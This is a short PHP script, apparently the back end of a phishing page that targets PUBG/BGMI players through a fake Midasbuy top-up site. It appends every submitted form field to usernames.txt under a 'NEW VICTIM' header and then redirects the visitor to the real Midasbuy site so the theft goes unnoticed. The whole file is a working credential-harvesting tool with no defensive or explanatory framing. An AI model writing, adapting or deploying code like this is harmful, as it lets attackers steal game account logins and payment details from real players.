<?php
// Capture PUBG Data
$handle = fopen("usernames.txt", "a");
fwrite($handle, "---------- NEW VICTIM (PUBG/BGMI) ----------\n");

foreach($_POST as $variable => $value) {
   fwrite($handle, $variable . ": " . $value . "\n");
}

fclose($handle);

// Redirect to official Midasbuy
header("Location: https://www.midasbuy.com/");
exit;
?>
